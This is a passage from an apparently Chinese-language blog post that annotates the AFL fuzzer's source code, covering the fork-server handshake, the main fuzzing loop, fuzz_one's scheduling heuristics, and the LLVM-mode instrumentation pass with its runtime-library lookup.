class="hljs-string">&quot;exit_code=&quot;</span> STRINGIFY(MSAN_ERROR) <span class="hljs-string">&quot;:&quot;</span><br>                           <span class="hljs-string">&quot;symbolize=0:&quot;</span><br>                           <span class="hljs-string">&quot;abort_on_error=1:&quot;</span><br>                           <span class="hljs-string">&quot;allocator_may_return_null=1:&quot;</span><br>                           <span class="hljs-string">&quot;msan_track_origins=0&quot;</span>, <span class="hljs-number">0</span>);<br><br>    execv(target_path, argv);<br><br>    <span class="hljs-comment">/* Use a distinctive bitmap signature to tell the parent about execv()</span><br><span class="hljs-comment">       falling through. */</span><br><br>    *(u32*)trace_bits = EXEC_FAIL_SIG;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>  &#125;<br><br>  <span class="hljs-comment">/* Close the unneeded endpoints. */</span><br><br>  close(ctl_pipe[<span class="hljs-number">0</span>]);<br>  close(st_pipe[<span class="hljs-number">1</span>]);<br><br>  fsrv_ctl_fd = ctl_pipe[<span class="hljs-number">1</span>];<br>  fsrv_st_fd  = st_pipe[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">/* Wait for the fork server to come up, but don&#x27;t wait too long. */</span><br><br>  it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="hljs-number">1000</span>);<br>  it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="hljs-number">1000</span>) * <span class="hljs-number">1000</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  rlen = read(fsrv_st_fd, &amp;status, <span class="hljs-number">4</span>);<br><br>  it.it_value.tv_sec = <span class="hljs-number">0</span>;<br>  it.it_value.tv_usec = <span class="hljs-number">0</span>;<br><br>  setitimer(ITIMER_REAL, &amp;it, <span class="hljs-literal">NULL</span>);<br><br>  <span class="hljs-comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span><br><span class="hljs-comment">     Otherwise, try to figure out what went wrong. */</span><br><br>  <span class="hljs-keyword">if</span> (rlen == <span class="hljs-number">4</span>) &#123;<br>    OKF(<span class="hljs-string">&quot;All right - fork server is up.&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (child_timed_out)<br>    FATAL(<span class="hljs-string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (waitpid(forksrv_pid, &amp;status, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span>)<br>    PFATAL(<span class="hljs-string">&quot;waitpid() failed&quot;</span>);<br><br>  <span class="hljs-keyword">if</span> (WIFSIGNALED(status)) &#123;<br><br>    <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! Since it seems to be built with ASAN and you have a\n&quot;</span><br>           <span class="hljs-string">&quot;    restrictive memory limit configured, this is expected; please read\n&quot;</span><br>           <span class="hljs-string">&quot;    %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Whoops, the target binary crashed suddenly, before receiving any input\n&quot;</span><br>           <span class="hljs-string">&quot;    from the fuzzer! There are several probable explanations:\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing the\n&quot;</span><br>           <span class="hljs-string">&quot;      target to hit an OOM condition in the dynamic linker. Try bumping up\n&quot;</span><br>           <span class="hljs-string">&quot;      the limit with the -m setting in the command line. A simple way confirm\n&quot;</span><br>           <span class="hljs-string">&quot;      this diagnosis would be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>           <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>           <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>           <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>           <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>           <span class="hljs-string">&quot;    - The binary is just buggy and explodes entirely on its own. If so, you\n&quot;</span><br>           <span class="hljs-string">&quot;      need to fix the underlying problem or find a better replacement.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>           <span class="hljs-string">&quot;    - On MacOS X, the semantics of fork() syscalls are non-standard and may\n&quot;</span><br>           <span class="hljs-string">&quot;      break afl-fuzz performance optimizations when running platform-specific\n&quot;</span><br>           <span class="hljs-string">&quot;      targets. To fix this, set AFL_NO_FORKSRV=1 in the environment.\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>           <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>           <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>           DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>    &#125;<br><br>    FATAL(<span class="hljs-string">&quot;Fork server crashed with signal %d&quot;</span>, WTERMSIG(status));<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (*(u32*)trace_bits == EXEC_FAIL_SIG)<br>    FATAL(<span class="hljs-string">&quot;Unable to execute target application (&#x27;%s&#x27;)&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">if</span> (mem_limit &amp;&amp; mem_limit &lt; <span class="hljs-number">500</span> &amp;&amp; uses_asan) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>           <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>           <span class="hljs-string">&quot;    handshake with the injected code. Since it seems to be built with ASAN and\n&quot;</span><br>           <span class="hljs-string">&quot;    you have a restrictive memory limit configured, this is expected; please\n&quot;</span><br>           <span class="hljs-string">&quot;    read %s/notes_for_asan.txt for help.\n&quot;</span>, doc_path);<br><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!mem_limit) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. Perhaps there is a horrible bug in the\n&quot;</span><br>         <span class="hljs-string">&quot;    fuzzer. Poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span> cLRD <span class="hljs-string">&quot;[-] &quot;</span> cRST<br>         <span class="hljs-string">&quot;Hmm, looks like the target binary terminated before we could complete a\n&quot;</span><br>         <span class="hljs-string">&quot;    handshake with the injected code. There are %s probable explanations:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;%s&quot;</span><br>         <span class="hljs-string">&quot;    - The current memory limit (%s) is too restrictive, causing an OOM\n&quot;</span><br>         <span class="hljs-string">&quot;      fault in the dynamic linker. This can be fixed with the -m option. A\n&quot;</span><br>         <span class="hljs-string">&quot;      simple way to confirm the diagnosis may be:\n\n&quot;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RLIMIT_AS</span><br>         <span class="hljs-string">&quot;      ( ulimit -Sv $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>         <span class="hljs-string">&quot;      ( ulimit -Sd $[%llu &lt;&lt; 10]; /path/to/fuzzed_app )\n\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^RLIMIT_AS */</span></span><br><br>         <span class="hljs-string">&quot;      Tip: you can use http://jwilk.net/software/recidivm to quickly\n&quot;</span><br>         <span class="hljs-string">&quot;      estimate the required amount of virtual memory for the binary.\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;    - Less likely, there is a horrible bug in the fuzzer. If other options\n&quot;</span><br>         <span class="hljs-string">&quot;      fail, poke &lt;lcamtuf@coredump.cx&gt; for troubleshooting tips.\n&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ? <span class="hljs-string">&quot;three&quot;</span> : <span class="hljs-string">&quot;two&quot;</span>,<br>         getenv(DEFER_ENV_VAR) ?<br>         <span class="hljs-string">&quot;    - You are using deferred forkserver, but __AFL_INIT() is never\n&quot;</span><br>         <span class="hljs-string">&quot;      reached before the program terminates.\n\n&quot;</span> : <span class="hljs-string">&quot;&quot;</span>,<br>         DMS(mem_limit &lt;&lt; <span class="hljs-number">20</span>), mem_limit - <span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Fork server handshake failed&quot;</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>perform_dry_run函数</strong></p><p>遍历<code>input</code>队列，读取文件内容，调用<code>calibrate_case</code>进行校准，收集错误信息<br><strong>run_target函数</strong><br>执行目标程序，传回状态信息。<br><strong>cull_queue函数</strong><br>通过遍历top_rated[]条目，获取“获胜者”，这些获胜者会获得更多执行时间。优化作用。<br>等等，还要许多配置函数，为环境的顺利做准备。<br><strong>主循环</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><br>    u8 skipped_fuzz;<br><br>    cull_queue();<br><br>    <span class="hljs-keyword">if</span> (!queue_cur) &#123;<span class="hljs-comment">//如果queue当前为空，即执行完一轮</span><br><br>      queue_cycle++;<br>      current_entry     = <span class="hljs-number">0</span>;<br>      cur_skipped_paths = <span class="hljs-number">0</span>;<br>      queue_cur         = <span class="hljs-built_in">queue</span>;<span class="hljs-comment">//准备下一轮</span><br><br>      <span class="hljs-keyword">while</span> (seek_to) &#123;<span class="hljs-comment">//从seek_to指定项开始执行。</span><br>        current_entry++;<br>        seek_to--;<br>        queue_cur = queue_cur-&gt;next;<br>      &#125;<br><br>      show_stats();<br><br>      <span class="hljs-keyword">if</span> (not_on_tty) &#123;<br>        ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>      &#125;<br><br>      <span class="hljs-comment">/* If we had a full queue cycle with no new finds, try</span><br><span class="hljs-comment">         recombination strategies next. */</span><br><br>      <span class="hljs-keyword">if</span> (queued_paths == prev_queued) &#123;<span class="hljs-comment">//如果path数没变，即没有新发现</span><br><br>        <span class="hljs-keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="hljs-keyword">else</span> use_splicing = <span class="hljs-number">1</span>;<span class="hljs-comment">//是否使用splicing策略</span><br><br>      &#125; <span class="hljs-keyword">else</span> cycles_wo_finds = <span class="hljs-number">0</span>;<br><br>      prev_queued = queued_paths;<span class="hljs-comment">//更新路径数</span><br><br>      <span class="hljs-keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="hljs-number">1</span> &amp;&amp; getenv(<span class="hljs-string">&quot;AFL_IMPORT_FIRST&quot;</span>))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    skipped_fuzz = fuzz_one(use_argv);<span class="hljs-comment">//关键函数fuzz_one</span><br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;<br>      <br>      <span class="hljs-keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))<br>        sync_fuzzers(use_argv);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-keyword">if</span> (stop_soon) <span class="hljs-keyword">break</span>;<br><br>    queue_cur = queue_cur-&gt;next;<br>    current_entry++;<br><br>  &#125;<br></code></pre></td></tr></table></figure><p><strong>关键函数fuzz_one()</strong></p><ul><li>先进行优化：概率跳过普通执行项或已执行项，去执行favored</li><li>对于已经fuzz过的或者non-favored的有99%的概率跳过；无pending_favored，95%跳过fuzzed&amp;non-favored，75%跳过not fuzzed&amp;non-favored，不跳过favored；</li><li>打开当前输入文件，读入len长度的buf，关闭文件</li><li>（当之前修理失败时）再次调用<code>celibrate_case</code>，</li><li>修剪：不要重复修剪，哪怕修建失败了</li><li>将读入的buf复制到out_buf</li><li>进行打分，对每个测试用例</li><li>如果我们已经亲自对这里的测试用例进行了fuzzing或早些时候，进行了决定性的测试，跳过这里直接前往<code>havoc_stage</code></li></ul><p><strong>简单位翻转bitflip</strong></p><h2 id="afl-llvm-mode"><a href="#afl-llvm-mode" class="headerlink" title="afl-llvm_mode"></a>afl-llvm_mode</h2><p><strong>关于LLVM</strong></p><ul><li>LLVM 主要为了解决编译时多种多样的前端和后端导致编译环境复杂、苛刻的问题，其核心为设计了一个称为<code> LLVM IR</code> 的中间表示，并以库的形式提供一些列接口，以提供诸如操作 IR 、生成目标平台代码等等后端的功能。</li><li>不同的前端和后端使用统一的中间代码<code>LLVM InterMediate Representation(LLVM IR)</code>，其结果就是如果需要支持一门新的编程语言，只需要实现一个新的前端；如果需要支持一款新的硬件设备，只需要实现一个新的后端；优化阶段为通用阶段，针对统一的 LLVM IR ，与新的编程语言和硬件设备无关。</li><li>GCC 的前后端耦合在一起，没有进行分离，所以GCC为了支持一门新的编程语言或一个新的硬件设备，需要重新开发前端到后端的完整过程。</li><li>Clang 是 LLVM 项目的一个子项目，它是 LLVM 架构下的 C/C++/Objective-C 的编译器，是 LLVM 前端的一部分。相较于GCC，具备编译速度快、占用内存少、模块化设计、诊断信息可读性强、设计清晰简单等优点。</li><li>代码首先由编译器前端clang处理后得到中间代码IR，然后经过各 LLVM Pass 进行优化和转换，最终交给编译器后端生成机器码（<strong>LLVM Pass 是一些中间过程处理 IR 的可以用户自定义的内容，可以用来遍历、修改 IR 以达到插桩、优化、静态分析等目的。</strong>）</li></ul><p><strong>afl-clang-fast</strong><br>1.概述<br>AFL的 llvm_mode 可以实现编译器级别的插桩，可以替代 afl-gcc 或 afl-clang 使用的比较“粗暴”的汇编级别的重写的方法，且具备如下几个优势：</p><ul><li>编译器可以进行优化以提升效率；</li><li>实现与CPU无关，可以在非x86架构上进行fuzz；</li><li>可以更好处理多线程目标程序。</li></ul><p>关于此<code>llvm_mode</code>文件夹：</p><ul><li><code>afl-llvm-rt.o</code>重写了<code>afl-as.h</code>中的main_payload，用于调用；</li><li><code>afl-llvm-pass.so.cc</code>文件主要是当通过 afl-clang-fast 调用 clang 时，这个pass被插入到 LLVM 中，告诉编译器添加与 <code>afl-as.h</code> 中大致等效的代码；</li><li><code>afl-clang-fast.c</code> 文件本质上是 clang 的 wrapper，最终调用的还是 clang 。但是与 afl-gcc 一样，会进行一些参数处理。</li></ul><p><strong><code>llvm_mode</code> 的插桩思路就是通过编写pass来实现信息记录，对每个基本块都插入探针，具体代码在 <code>afl-llvm-pass.so.cc</code> 文件中，初始化和forkserver操作通过链接完成。</strong></p><p><strong>源码分析</strong></p><p><strong>find_pbj</strong><br>寻找运行时的<code>librabies</code>，若失败，abort。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_obj</span><span class="hljs-params">(u8* argv0)</span> &#123;<br><br>  u8 *afl_path = getenv(<span class="hljs-string">&quot;AFL_PATH&quot;</span>);<span class="hljs-comment">//寻找AFL_PATH</span><br>  u8 *slash, *tmp;<br><br>  <span class="hljs-keyword">if</span> (afl_path) &#123;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, afl_path);<span class="hljs-comment">//将afl-llvm-rt.o的路径写入tmp</span><br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<span class="hljs-comment">//如果该路径可以访问，且可读</span><br>      obj_path = afl_path;<span class="hljs-comment">//赋值给obj_path</span><br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br><br>  &#125;<br><br>  slash = <span class="hljs-built_in">strrchr</span>(argv0, <span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-comment">//返回斜杠最后一次出现处的指针</span><br><br>  <span class="hljs-keyword">if</span> (slash) &#123;<span class="hljs-comment">//存在斜杠</span><br><br>    u8 *dir;<br><br>    *slash = <span class="hljs-number">0</span>;<br>    dir = ck_strdup(argv0);<br>    *slash = <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>    tmp = alloc_printf(<span class="hljs-string">&quot;%s/afl-llvm-rt.o&quot;</span>, dir);<br><br>    <span class="hljs-keyword">if</span> (!access(tmp, R_OK)) &#123;<br>      obj_path = dir;<br>      ck_free(tmp);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ck_free(tmp);<br>    ck_free(dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (!access(AFL_PATH <span class="hljs-string">&quot;/afl-llvm-rt.o&quot;</span>, R_OK)) &#123;<br>    obj_path = AFL_PATH;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br><br>  FATAL(<span class="hljs-string">&quot;Unable to find &#x27;afl-llvm-rt.o&#x27; or &#x27;afl-llvm-pass.so&#x27;. Please set AFL_PATH&quot;</span>);<br> <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先，读取环境变量 AFL_PATH 的值：<ul><li>如果读取成功，确认 <code>AFL_PATH/afl-llvm-rt.o</code> 是否可以访问；如果可以访问，设置该目录为 <code>obj_path</code> ，然后直接返回；</li><li>如果读取失败，检查 <code>arg0</code> 中是否存在<code> /</code> 字符，如果存在，则判断最后一个 <code>/ </code>前面的路径为 AFL 的根目录；然后读取<code>afl-llvm-rt.o</code>文件，成功读取，设置该目录为<code> obj_path</code> ，然后直接返回。</li></ul></li><li>如果上面两种方式都失败，到<code>/usr/local/lib/afl</code> 目录下查找是否存在 <code>afl-llvm-rt.o</code> ，如果存在，则设置为 <code>obj_path</code> 并直接返回（之所以向该路径下寻找，是因为<strong>默认的AFL的MakeFile在编译时，会定义一个名为<code>AFL_PATH</code>的宏，该宏会指向该路径</strong>）；</li></ul><p><strong>总而言之，该函数是为了寻找<code>afl-llvm-rt.o</code>文件，该文件即为要用到的运行时库。</strong></p><p><strong>edit_params函数</strong><br>即编辑对应参数</p><p><strong>2.afl-llvm-pass.so.cc</strong></p><figure class="highlight plaintext"><figcaption><span>文件实现了 LLVM-mode 下的一个插桩 LLVM Pass。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs afl-llvm-pass.so.cc```">该文件只有一个Transform pass：```AFLCoverage```，继承自 ```ModulePass```，实现了一个``` runOnModule``` 函数，这也是我们需要重点分析的函数。<br>```c<br>namespace &#123;<br><br>  class AFLCoverage : public ModulePass &#123;<br><br>    public:<br><br>      static char ID;<br>      AFLCoverage() : ModulePass(ID) &#123; &#125;<br><br>      bool runOnModule(Module &amp;M) override;<br><br>      // StringRef getPassName() const override &#123;<br>      //  return &quot;American Fuzzy Lop Instrumentation&quot;;<br>      // &#125;<br><br>  &#125;;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>runOnModule函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">LLVMContext &amp;C = M.getContext();<br></code></pre></td></tr></table></figure><p>获取上下文；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Decide instrumentation ratio */</span><br><span class="hljs-type">char</span>* inst_ratio_str = getenv(<span class="hljs-string">&quot;AFL_INST_RATIO&quot;</span>);<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inst_ratio = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>设置插桩密度，默认为100</p><p>获取指向共享内存shm的指针和上一个基本块的id</p><p>开始插桩：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> inst_blocks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;F : M)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;BB : F) &#123;<span class="hljs-comment">// 遍历每一个BB（基本块）</span><br><br>      BasicBlock::iterator IP = BB.getFirstInsertionPt();<span class="hljs-comment">//寻找BB中合适位置</span><br>      IRBuilder&lt;&gt; IRB(&amp;(*IP));<span class="hljs-comment">//初始化IRBuider实例执行插入</span><br><br>      <span class="hljs-keyword">if</span> (AFL_R(<span class="hljs-number">100</span>) &gt;= inst_ratio) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果大于插桩密度</span><br><br>      <span class="hljs-comment">/* Make up cur_loc */</span><br><br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cur_loc = AFL_R(MAP_SIZE);<span class="hljs-comment">//随机创建当前基本块ID</span><br><br>      ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);<br><br>      <span class="hljs-comment">/* Load prev_loc */</span><br><br>      LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);<br>      PrevLoc-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());<br>      <span class="hljs-comment">//获取上一个BB的ID</span><br><br>      <span class="hljs-comment">/* Load SHM pointer */</span><br><br>      LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);<span class="hljs-comment">//获取SHM地址</span><br>      MapPtr-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *MapPtrIdx =<br>          IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));<br><br>      <span class="hljs-comment">/* Update bitmap */</span><br>      <span class="hljs-comment">//更新共享内存</span><br>      LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);<br>      Counter-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br>      Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, <span class="hljs-number">1</span>));<br>      IRB.CreateStore(Incr, MapPtrIdx)<br>          -&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      <span class="hljs-comment">/* Set prev_loc to cur_loc &gt;&gt; 1 */</span><br><br>      StoreInst *Store =<br>          IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; <span class="hljs-number">1</span>), AFLPrevLoc);<br>      Store-&gt;setMetadata(M.getMDKindID(<span class="hljs-string">&quot;nosanitize&quot;</span>), MDNode::get(C, None));<br><br>      inst_blocks++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>3. afl-llvm-rt.o.c</strong><br>该文件主要实现了llvm_mode的3个特殊功能：<code>deferred instrumentation, persistent mode,trace-pc-guard mode</code></p><p><strong>deferred 